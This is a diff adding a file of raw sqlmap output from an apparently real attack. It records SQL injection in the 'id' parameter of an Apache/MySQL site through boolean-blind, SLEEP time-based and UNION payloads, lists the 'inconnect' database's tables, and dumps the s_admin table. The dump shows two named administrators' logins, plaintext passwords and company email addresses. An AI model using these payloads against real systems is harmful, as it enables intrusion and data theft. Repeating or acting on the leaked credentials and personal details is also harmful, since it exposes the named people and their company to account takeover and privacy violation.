@@ -1,0 +1,98 @@
+sqlmap identified the following injection point(s) with a total of 60 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=25 AND 9465=9465
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=25 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=-9171 UNION ALL SELECT NULL,NULL,CONCAT(0x7178707071,0x5355635351706549686f6e444c56785a6b6e6374495273614d6c646d5a484f477079785a45554b67,0x7178766271),NULL,NULL,NULL,NULL-- MGpl
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] inconnect
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=25 AND 9465=9465
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=25 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=-9171 UNION ALL SELECT NULL,NULL,CONCAT(0x7178707071,0x5355635351706549686f6e444c56785a6b6e6374495273614d6c646d5a484f477079785a45554b67,0x7178766271),NULL,NULL,NULL,NULL-- MGpl
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: inconnect
+[7 tables]
++-----------------+
+| s_admin         |
+| s_banners       |
+| s_categorias    |
+| s_departamentos |
+| s_emails        |
+| s_noticias      |
+| s_produtos      |
++-----------------+
+
+Database: inconnect
++--------------+---------+
+| Table        | Entries |
++--------------+---------+
+| s_emails     | 31      |
+| s_noticias   | 9       |
+| s_produtos   | 6       |
+| s_banners    | 4       |
+| s_categorias | 3       |
+| s_admin      | 2       |
++--------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=25 AND 9465=9465
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=25 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: id=-9171 UNION ALL SELECT NULL,NULL,CONCAT(0x7178707071,0x5355635351706549686f6e444c56785a6b6e6374495273614d6c646d5a484f477079785a45554b67,0x7178766271),NULL,NULL,NULL,NULL-- MGpl
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: inconnect
+Table: s_admin
+[2 entries]
++------------+-------------------------+---------------+---------------+---------------------------------+
+| s_admin_id | s_admin_nome            | s_admin_senha | s_admin_login | s_admin_email                   |
++------------+-------------------------+---------------+---------------+---------------------------------+
+| 8          | Fernando Henrique Köetz | 2444          | koetz         | fernando.koetz@inconnect.com.br |
+| 7          | Lucas Wolff de Matos    | lucas         | lucas         | lucas@inconnect.com.br          |
++------------+-------------------------+---------------+---------------+---------------------------------+
+
